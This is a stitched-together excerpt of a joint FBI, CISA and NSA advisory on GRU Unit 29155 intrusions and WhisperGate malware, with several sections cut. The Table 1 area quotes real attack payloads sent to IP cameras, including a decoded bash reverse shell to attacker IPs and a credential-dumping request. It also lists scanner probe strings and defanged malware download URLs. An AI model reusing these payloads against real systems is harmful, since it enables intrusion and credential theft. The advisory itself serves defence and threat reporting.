GRU Unit 29155 cyber actors began deploying the destructive WhisperGate](https://attack.mitre.org/software/S0689/) malware\nagainst multiple Ukrainian victim organizations as early as January 13, 2022. These cyber actors are\nseparate from other known and more established GRU-affiliated cyber groups, such as Unit 26165 and\nUnit 74455.\n\nTo mitigate this malicious cyber activity, organizations should take the following actions today:\n\n  - Prioritize routine system updates and remediate known exploited vulnerabilities.\n\n  - Segment networks to prevent the spread of malicious activity.\n\n  - Enable phishing-resistant multifactor authentication (MFA) for all externally facing account services,\nespecially for webmail, virtual private networks (VPNs), and accounts that access critical systems.\n\nThis Cybersecurity Advisory provides tactics, techniques, and procedures (TTPs) associated with Unit\n29155 cyber actors—both during and succeeding their deployment of WhisperGate against Ukraine—as\nwell as further analysis (see Appendix A) of the WhisperGate malware initially published in the joint\n[advisory, Destructive Malware Targeting Organizations in Ukraine, published February 26, 2022.](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a)\n\n_This document is marked TLP:CLEAR.

See the MITRE\nATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK\ntactics and techniques.\n\n### GRU Unit 29155: Cyber Component\n\nFBI, NSA, and CISA assess Unit 29155 is responsible for attempted coups, sabotage and influence\noperations, and assassination attempts throughout Europe. Unit 29155 expanded their tradecraft to\ninclude offensive cyber operations since at least 2020. Unit 29155 cyber actors’ objectives appear to\ninclude the collection of information for espionage purposes, reputational harm caused by the theft and\n[leakage of sensitive information, and systematic sabotage caused by the destruction of data [T1485].](https://attack.mitre.org/versions/v15/techniques/T1485/)\n\nFBI assesses the Unit 29155 cyber actors to be junior active-duty GRU officers under the direction of\nexperienced Unit 29155 leadership. These individuals appear to be gaining cyber experience and\nenhancing their technical skills through conducting cyber operations and intrusions. Additionally, FBI\nassesses Unit 29155 cyber actors rely on non-GRU actors, including known cyber-criminals and enablers to\nconduct their operations.\n\n\n-----\n\n**TLP:CLEAR**\n\nFBI | CISA | NSA | et. al\n\n\n### Cybersecurity Industry Tracking\n\nThe cybersecurity industry provides overlapping cyber threat intelligence, IOCs, and mitigation\nrecommendations related to Unit 29155 cyber actors. While not all encompassing, the following are the\nmost notable threat group names related under [MITRE ATT&CK G1003 and commonly used within the](https://attack.mitre.org/groups/G1003)\ncybersecurity community.\n\n  - [Cadet Blizzard (formerly known as DEV-0586 by Microsoft)[1],[2]](https://www.microsoft.com/en-us/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/)\n\n  - [Ember Bear (also known as Bleeding Bear by CrowdStrike)[3]](https://www.crowdstrike.com/blog/who-is-ember-bear/)\n\n  - Frozenvista\n\n  - [UNC2589[4]](https://cloud.google.com/blog/topics/threat-intelligence/russia-invasion-ukraine-retaliation/)\n\n  - [UAC-0056[5]](https://www.sentinelone.com/blog/threat-actor-uac-0056-targeting-ukraine-with-fake-translation-software/)\n\nNote: Cybersecurity companies have different methods of tracking and attributing cyber actors, and this\nmay not be a 1:1 correlation to the U.S. Government’s understanding for all activity related to these\ngroupings.\n\n### Victimization\n\nIn addition to WhisperGate and other incidents against Ukraine, Unit 29155 cyber actors have conducted\ncomputer network operations against numerous members of the North Atlantic Treaty Organization (NATO)\nin Europe and North America, as well as countries in Europe, Latin America, and Central Asia. The activity\nincludes cyber campaigns such as website defacements, infrastructure scanning, data exfiltration, and\ndata leak operations. These actors sell or publicly release exfiltrated victim data obtained from their\ncompromises. Since early 2022, the primary focus of the cyber actors appears to be targeting and\ndisrupting efforts to provide aid to Ukraine.\n\nTo date, the FBI has observed more than 14,000 instances of domain scanning across at least 26 NATO\nmembers and several additional European Union (EU) countries. Unit 29155 cyber actors have defaced\nvictim websites and used public website domains to post exfiltrated victim information.\n\nWhether through offensive operations or scanning activity, Unit 29155 cyber actors are known to target\ncritical infrastructure and key resource sectors, including the government services, financial services,\ntransportation systems, energy, and healthcare sectors of NATO members, the EU, Central American, and\nAsian countries.\n\n### TTP Overview\n\n#### Reconnaissance\n\n[Unit 29155 cyber actors have been observed targeting IP ranges [T1595.001] used within multiple](https://attack.mitre.org/versions/v15/techniques/T1595/001/)\ngovernment and critical infrastructure organizations. The following are publicly available tools these cyber\n[actors have used for scanning [T1595] and vulnerability exploit efforts. Unit 29155 cyber actors were not](https://attack.mitre.org/versions/v15/techniques/T1595/)\nobserved using these tools outside of their intended purpose. Note: Use of these tools should not be\nattributed as malicious without analytical evidence to support threat actor use and/or control.\n\n  - Acunetix: Unit 29155 cyber actors leveraged both Acunetix and Nmap to identify open ports,\n[services, and vulnerabilities for networks [T1595.002].[6]](https://attack.mitre.org/versions/v15/techniques/T1595/002/)\n\n\n-----\n\n**TLP:CLEAR**\n\nFBI | CISA | NSA | et. al\n\n\n\n  - Amass: Unit 29155 cyber actors leveraged both Amass and VirusTotal to obtain subdomains for\n[target websites [T1590.002].[7]](https://attack.mitre.org/versions/v15/techniques/T1590/002/)\n\n  - [Droopescan[8]](https://kalilinuxtutorials.com/droopescan/)\n\n  - [JoomScan[9]](https://github.com/OWASP/joomscan)\n\n  - MASSCAN: Unit 29155 cyber actors used MASSCAN and Nmap to discover other machines once\n[inside victim networks.[10]](https://www.kali.org/tools/masscan/)\n\n  - [Netcat[11]](https://www.digitalocean.com/community/tutorials/how-to-use-netcat-to-establish-and-test-tcp-and-udp-connections)\n\n  - Nmap: Once Unit 29155 cyber actors gained access to victim internal networks, they further used\nNmap (via the Nmap Scripting Engine [NSE]) to write custom scripts for discovering and scanning\n[other machines [T1046].](https://attack.mitre.org/versions/v15/techniques/T1046/)\n\n  - Shodan: Unit 29155 cyber actors used Shodan to identify hosts with a specific set of vulnerabilities\n[or device types [T1596.005].[12]](https://attack.mitre.org/versions/v15/techniques/T1596/005/)\n\n  - [VirusTotal[13]](https://docs.virustotal.com/docs/how-it-works)\n\n  - WPScan\n\nAdditionally, Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration\n\n[[T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration. Adminer in](https://attack.mitre.org/versions/v15/techniques/T1572/)\n[combination with Impacket and ldapdomaindump were tools used for gathering information on AD. Once](https://attack.mitre.org/versions/v15/software/S0357/)\nactive devices are found, Unit 29155 cyber actors look for vulnerabilities to exploit. For example, the\nAcunetix vulnerability scanning tool has been used for gathering information on potential vulnerabilities\nsuch as blind cross-site scripting, as shown in the following commands:\n```\nGET /index.php?log=to@example.com>%0d%0abcc:009247.3183377.3183.1bf6c.19446.2@bxss.me\n\"GET /CMS/files/log.htm HTTP/1.1\" * * \"(nslookup hitccruvbrumn76c1b.bxss.me||perl\n-e \\\"gethostbyname('hitccruvbrumn76c1b.bxss.me')\\\")\"\n\n```\nAs the cyber actors perform reconnaissance on victim networks and discover vulnerabilities within victim\nweb servers or machines, they obtain CVE exploit scripts from GitHub repositories and use them against\n[victim infrastructure [T1588.005]. Unit 29155 cyber actors have been observed obtaining the respective](https://attack.mitre.org/versions/v15/techniques/T1588/005/)\nexploit scripts for, but not exploiting, the following CVEs:\n\n  - [CVE-2020-1472](https://nvd.nist.gov/vuln/detail/CVE-2020-1472) (Microsoft: Windows Server)\n\n  - [CVE-2021-26084](https://nvd.nist.gov/vuln/detail/CVE-2021-26084) (Atlassian Confluence Server and Data Center)\n\n  - [CVE-2021-3156](https://nvd.nist.gov/vuln/detail/CVE-2021-3156) (Red Hat: Privilege Escalation via Command Line Argument Parsing)\n\n  - [CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034) (Red Hat: Polkit Privilege Escalation)\n\n  - [CVE-2022-27666](https://nvd.nist.gov/vuln/detail/CVE-2022-27666) (Red Hat: Heap Buffer Overflow Flaw)\n\n[Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as](https://attack.mitre.org/versions/v15/techniques/T1190/)\ndetailed throughout this advisory:\n\n  - [CVE-2021-33044](https://nvd.nist.gov/vuln/detail/CVE-2021-33044) (Dahua Security)\n\n  - [CVE-2021-33045](https://nvd.nist.gov/vuln/detail/CVE-2021-33045) (Dahua Security)\n\n\n-----\n\n**TLP:CLEAR**\n\nFBI | CISA | NSA | et. al\n\n\n\n  - [CVE-2022-26134](https://nvd.nist.gov/vuln/detail/CVE-2022-26134) (Atlassian Confluence Server and Data Center)\n\n  - [CVE-2022-26138](https://nvd.nist.gov/vuln/detail/CVE-2022-26138) (Atlassian Confluence Server and Data Center)\n\n  - [CVE-2022-3236](https://nvd.nist.gov/vuln/detail/CVE-2022-3236) (Sophos: Firewall)\n\n#### Resource Development\n\nRather than build custom solutions, Unit 29155 cyber actors use common red teaming techniques and\npublicly available tools to conduct cyber operations. As a result, many TTPs overlap with those of other\ncyber actors, which can lead to misattribution.\n\nUnit 29155 actors and their cyber-criminal affiliates commonly maintain accounts on dark web forums; this\nhas provided the opportunity to obtain various hacker tools such as malware and malware loaders\n\n[[T1588.001] like Raspberry Robin and SaintBot. While Unit 29155 cyber actors are best known for their](https://attack.mitre.org/versions/v15/techniques/T1588/001/)\nuse of WhisperGate malware against Ukraine, the use of WhisperGate is not unique to the group. Technical\nanalysis can be found in Appendix A: WhisperGate Malware Analysis.\n\n#### Initial Access\n\nUnit 29155 cyber actors are known to use VPNs to anonymize their operational activity. These cyber actors\ncommonly attempt to exploit weaknesses in internet-facing systems, like the CVEs listed above, to initially\naccess networks. In one instance, Unit 29155 cyber actors exploited CVE-2021-33044 and CVE-202133045 on Dahua IP cameras to bypass identity authentication.\n\n#### Lateral Movement\n\nUnit 29155 cyber actors have used Shodan to scan for Internet of Things (IoT) devices, using exploitation\n[scripts to authenticate to IP cameras with default usernames and passwords [T1078.001], and exfiltrating](https://attack.mitre.org/versions/v15/techniques/T1078/001/)\n[images [T1125] (JPG files). Attempts are then made to perform remote command execution via web to](https://attack.mitre.org/versions/v15/techniques/T1125/)\nvulnerable IP cameras; if successful, cyber actors would dump configuration settings and credentials in\n[plaintext (as shown in Table 1 below) [T1552.001].](https://attack.mitre.org/versions/v15/techniques/T1552/001/)\n\nAppendix B: Indicators of Compromise lists threat actor IP addresses associated with the activity detailed in\nthis section.\n\n\n-----\n\n**TLP:CLEAR**\n\nFBI | CISA | NSA | et. al\n\n\n_Table 1: IoT Exploitation Events_\n\nNote: These events are independent and not correlated as a single timeline of compromise.\n\nEvent Victim Observation\n\nThese requests are likely intended to dump configuration settings and credentials\n\n[[T1003]:](https://attack.mitre.org/versions/v15/techniques/T1003/)\n```\n          hxxp://<IP>:<port>/PictureCatch.cgi?username=<NAME>&password=\n\n```\nWeb requests\nobserved from victim `%3becho%20%22%3c%21--%23include%20file=%22SYS_CFG%22--`\ninfrastructure `%3e%22%3etmp/Login.htm%3b&data_type=1&attachment=1&channel=1&`\n```\n          secret=1&key=PWNED\n          hxxp://<IP>:<port>/ssi.cgi/tmp/Login.htm\n           \"txtUser=lol&txtPassword=2&btConnect=Piesl%C4%93gtiesbtConnect=P\n           iesl%C4%93gties&chRemember=on&txtPassword=g00dPa%24%24w0rD&txtUs\n           er=$%7b@print(system(%22bash%20           i%20%3E%26%20%2Fdev%2Ftcp%2F179.43.175.38%2F6870%200%3E%261%22))\n\n```\nPOST requests sent to `%7d\"`\nvictims with payloads\n```\n          \"txtUser=lol&txtPassword=2&btConnect=Piesl%C4%93gtiesbtConnec\n\n```\n[[T1071.001]](https://attack.mitre.org/versions/v15/techniques/T1071/001/)\n```\n          t=Piesl%C4%93gties&chRemember=on&txtPassword=g00dPa%24%24w0rD\n          &txtUser=$%7b@print(system(%22bash%20          i%20%3E%26%20%2Fdev%2Ftcp%2F81.17.24.130%2F6870%200%3E%261%22\n          ))%7d\"\n\n```\nURL encoded values\nfrom txtUser for both `${@print(system(\"bash -i >& /dev/tcp/179.43.175.38/6870 0>&1\"))}`\ncommands decoded\n```\n          ${@print(system(\"bash -i >& /dev/tcp/81.17.24.130/6870\n```\nto embedded bash\n```\n          0>&1\"))}\n```\ncommands\n\nIn addition, incident analysis identified the general observations listed below on victim infrastructure.

These mitigations align with the CrossSector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards\nand Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST\nrecommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity\nframeworks and guidance to protect against the most common and impactful threats, tactics, techniques,\n[and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals) for more information on the\nCPGs, including additional recommended baseline protections.\n\n\n-----\n\n**TLP:CLEAR**\n\nFBI | CISA | NSA | et. al\n\n\n### Limit Adversarial Use of Common Vulnerabilities\n\n  - Prioritize patching to CISA’s [Known Exploited Vulnerabilities Catalog, especially for CVEs identified](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\nin this advisory, and then critical and high vulnerabilities that allow for remote code execution on\ninternet-facing devices.\n\n  - Conduct regular automated vulnerability scans to perform vulnerability assessments on all network\n[resources based on threat actor behaviors and known exploitable vulnerabilities (CISA CPG 1.E).](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E)\n\n  - Limit exploitable services on internet-facing assets, such as email and remote management\n[protocols (CISA CPGs 2.M,](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#EmailSecurity2M) [2.W). Where necessary services must be exposed, such as services](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NoExploitableServicesontheInternet2W)\nhosted in a demilitarized zone (DMZ), implement the appropriate compensatory controls to prevent\ncommon forms of abuse and exploitation. Disable all unnecessary operating system applications\nand network protocols to combat adversary enumeration. For additional guidance, see CISA\n[Insights: Remediate Vulnerabilities for Internet-Accessible Systems.](https://www.cisa.gov/sites/default/files/publications/CISAInsights-Cyber-RemediateVulnerabilitiesforInternetAccessibleSystems_S508C.pdf)\n\n  - U.S. organizations can utilize a range of CISA services at no cost, including vulnerability scanning\nand testing, to help organizations reduce exposure to threats. CISA Cyber Hygiene services can\nprovide additional review of internet-accessible assets and provide regular reports on steps to take\n[to mitigate vulnerabilities. Email vulnerability@cisa.dhs.gov](mailto:vulnerability@cisa.dhs.gov) with the subject line, “Requesting Cyber\nHygiene Services,” to get started.\n\n  - Software manufacturers, vendors, and consumers are encouraged to review CISA and NIST’s\n[Defending Against Supply Chain Attacks.

CISA recommends\ncomprehensive mitigations for supply chain incident reporting, vulnerability disclosing (e.g.,\nsecurity.txt), and choosing a trusted supplier or vendor that observes proper cyber security hygiene\n[(CISA CPG 1.G,](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SupplyChainIncidentReporting1G) [1.H,](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SupplyChainVulnerabilityDisclosure1H) [1.I) to defend against upstream attacks.](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#VendorSupplierCybersecurityRequirements1I)\n\n### Deploy Protective Controls and Architecture\n\n  - Implement network segmentation. Network segmentation can help prevent lateral movement by\n[controlling traffic flows between—and access to—various subnetworks (CISA CPG 2.F). Best practice](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F)\nmitigations include updating Identity and Access Management (IAM) and employing phishingresistant MFA for all devices and accounts identified as organizational assets. For additional\nguidance, see CISA and NSA’s [IAM Recommended Best Practices Guide for Administrators (CISA](https://www.cisa.gov/news-events/alerts/2023/03/21/cisa-and-nsa-release-enduring-security-framework-guidance-identity-and-access-management)\n[CPG 2.H).](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H)\n\n  - Verify and ensure that sensitive data, including credentials, are not stored in plaintext and can only\nbe accessed by authenticated and authorized users. Credentials must be stored in a secure\n[manner, such as with a credential/password manager to protect from malicious enumeration (CISA](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SecureSensitiveData2L)\n[CPG 2.L).](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SecureSensitiveData2L)\n\n  - Disable and/or restrict use of command line and PowerShell activity. Update to the latest version\n[and uninstall all earlier PowerShell versions (CISA CPG 2.N).](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DisableMacrosbyDefault2N)\n\n\n-----\n\n**TLP:CLEAR**\n\nFBI | CISA | NSA | et. al\n\n\n\n  - Implement a continuous system monitoring program, such as security information and event\nmanagement (SIEM) or endpoint detection and response (EDR) solutions, to comprehensively log\nand review all authorized external access connections. This logging will better ensure the prompt\n[detection of misuse or abnormal activity (CISA CPG 2.T).](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#LogCollection2T)\n\n  - Monitor for unauthorized access attempts and programming anomalies through comprehensive\nlogging that is secured from modification, such as limiting permissions and adding redundant\n[remote logging (CISA CPG 2.U). Security appliances should be set to detect and/or block Impacket](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SecureLogStorage2U)\nframework indicators, PSExec or WMI commands, and suspicious PowerShell commands for timely\nidentification and remediation.\n\n  - Identify any use of outdated or weak encryption, update these to sufficiently strong algorithms, and\n[consider the implications of post-quantum cryptography (CISA CPG 2.K).](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#StrongandAgileEncryption2K) Use properly configured\nand up-to-date Secure Socket Layer (SSL)/Transport Layer Security (TLS) to protect data in transit.\n\n## Security Controls\n\nIn addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating\nyour organization's security program against the threat behaviors mapped to the MITRE ATT&CK for\nEnterprise framework in this advisory. The authoring agencies recommend testing your existing security\ncontrols inventory to assess how they perform against the ATT&CK techniques described in this advisory.\n\nTo get started:\n\n1. Select an ATT&CK technique described in this advisory (see Table 3 to Table 14).\n\n2. Align your security technologies against the technique.\n\n3. Test your technologies against the technique.\n\n4. Analyze your detection and prevention technologies’ performance.\n\n5. Repeat the process for all security technologies to obtain a set of comprehensive performance\ndata.\n\n6. Tune your security program, including people, processes, and technologies, based on the data\ngenerated by this process.\n\nThe authoring agencies recommend continually testing your security program, at scale, in a production\nenvironment to ensure optimal performance against the MITRE ATT&CK techniques identified in this\nadvisory.\n\n## Resources\n\n  - [MITRE: WhisperGate](https://attack.mitre.org/software/S0689/)\n\n  - [CISA AA22-057A: Destructive Malware Targeting Organizations in Ukraine](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a)\n\n  - [DOJ Press Release: Russian National Charged for Conspiring with Russian Military Intelligence to](https://www.justice.gov/opa/pr/russian-national-charged-conspiring-russia-military-intelligence-destroy-ukrainian)\n[Destroy Ukrainian Government Computer Systems and Data](https://www.justice.gov/opa/pr/russian-national-charged-conspiring-russia-military-intelligence-destroy-ukrainian)\n\n  - [FBI: Cyber Crime](https://www.fbi.gov/investigate/cyber)\n\n\n-----\n\n**TLP:CLEAR**\n\nFBI | CISA | NSA | et. al\n\n\n\n  - [CISA: Russia Cyber Threat Overview and Advisories](https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/russia)\n\n  - [MITRE: Group G1003 - Ember Bear](https://attack.mitre.org/groups/G1003/)\n\n  - [MITRE: Impacket](https://attack.mitre.org/versions/v15/software/S0357/)\n\n  - [NIST NVD: CVE-2020-1472](https://nvd.nist.gov/vuln/detail/CVE-2020-1472)\n\n  - [NIST NVD: CVE-2021-26084](https://nvd.nist.gov/vuln/detail/CVE-2021-26084)\n\n  - [NIST NVD: CVE-2021-3156](https://nvd.nist.gov/vuln/detail/CVE-2021-3156)\n\n  - [NIST NVD: CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)\n\n  - [NIST NVD: CVE-2022-27666](https://nvd.nist.gov/vuln/detail/CVE-2022-27666)\n\n  - [NIST NVD: CVE-2021-33044](https://nvd.nist.gov/vuln/detail/CVE-2021-33044)\n\n  - [NIST NVD: CVE-2021-33045](https://nvd.nist.gov/vuln/detail/CVE-2021-33045)\n\n  - [NIST NVD: CVE-2022-26134](https://nvd.nist.gov/vuln/detail/CVE-2022-26134)\n\n  - [NIST NVD: CVE-2022-26138](https://nvd.nist.gov/vuln/detail/CVE-2022-26138)\n\n  - [NIST NVD: CVE-2022-3236](https://nvd.nist.gov/vuln/detail/CVE-2022-3236)\n\n  - [MITRE: BloodHound](https://attack.mitre.org/software/S0521/)\n\n  - [MITRE: Rclone](https://attack.mitre.org/versions/v15/software/S1040/)\n\n  - [MITRE: P.A.S.

The analysis provides insight into Unit 29155 cyber actor infrastructure used\nfor network scanning, password compromising, and data exfiltration against Ukraine, NATO members in\nEurope and North America, and countries in Latin America and Central Asia.\n\nUnit 29155 cyber actors’ use of WhisperGate involved the deployment of the malware files, stage1.exe\nand stage2.exe. WhisperGate has two stages that corrupts a system’s master boot record, displays a\nfake ransomware note, and encrypts files based on certain file extensions (see [AA22-057A). The actors](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a)\nused multiple Discord accounts to store malware files, including what appears to be development versions\nor iterations of the binaries. Discord is commonly leveraged by threat actors as an endpoint for malware\ndistribution and control; in this case, it was used to obtain the next step of the infection chain by directly\nsharing files through its platform. In the case of stage2.exe, the binary communicated with Discord to\nobtain Tbopbh.jpg—the malicious payload that is in-memory loaded and performs the destructive\n[capabilities.[18]](https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/)\n\n### Categorization\n\nThe Discord accounts associated with the WhisperGate campaign are categorized into three main clusters,\nlabeled below as Clusters 1, 2, and 3. All clusters used Discord as a staging environment for malware\ndeployment. These groupings are based on analysis of threat actor IP addresses and the nature of the\nmalware that existed within the accounts. The following sections include notable details found within each\ncluster.\n\n#### Cluster 1\n\nCluster 1 contained the following files:\n\n  - `hxxps://cdn.discordapp[.]com/attachments/928503440139771947/9301086376811847`\n```\n   68/Tbopbh.jpg (a resource, e.g., payload, for stage2.exe)[18]\n\n```\n  - `saint.exe (a downloader, SaintBot, as detailed by CERT-UA)[19]`\n\n  - `puttyjejfrwu.exe[19]`\n\n#### Cluster 2\n\nCluster 2 contained:\n\n  - `hxxps://cdn.discordapp[.]com/attachments/888408190625128461/8956339522477998`\n```\n   58/n.lashevychdirekcy.atom.gov.ua.zip (means for sending malware in over 35 different\n\n```\n[zip files via Discord links)[20]](https://www.bellingcat.com/news/2022/02/23/attack-on-ukrainian-government-websites-linked-to-russian-gru-hackers/)\n\n  - Several Microsoft Word documents with macros that download test01.exe from 3237.site.\nOnce executed, test01.exe downloads load2022.exe from smm2021.net.\n\n\n-----\n\n**TLP:CLEAR**\n\nFBI | CISA | NSA | et. al\n\n\n#### Cluster 3\n\nCluster 3 contained:\n\n  - `hxxps://cdn.discordapp[.]com/attachments/945968593030496269/9459704461495091`\n```\n   30/Client.exe (Note: Unit 29155 cyber actors’ use of Client.exe was confirmed as linked to\n\n```\nthe activity, but the file was not obtained for analysis and functionality cannot be confirmed.)\n\n  - `asd.exe (likely a development version of stage1.exe)`\n\n### Behavioral Analysis\n\nTwo Windows Portable Executable (PE) files (stage1.exe and stage2.exe) were obtained from the\nUkrainian victim for analysis. One PE file (asd.exe) was obtained from a U.S. victim.\n\n#### stage1.exe\n```\nstage1.exe was obtained from the C:\\ path of the Ukrainian victim’s Windows machine. stage1.exe\n\n```\nexecutes when the infected device is powered down, overwriting the master boot record (MBR) and\npreventing the system from booting normally.

Of note, the MD5 and SHA-256 hash values were different than those obtained from the Ukrainian\nvictim machine (listed above in Table 17).
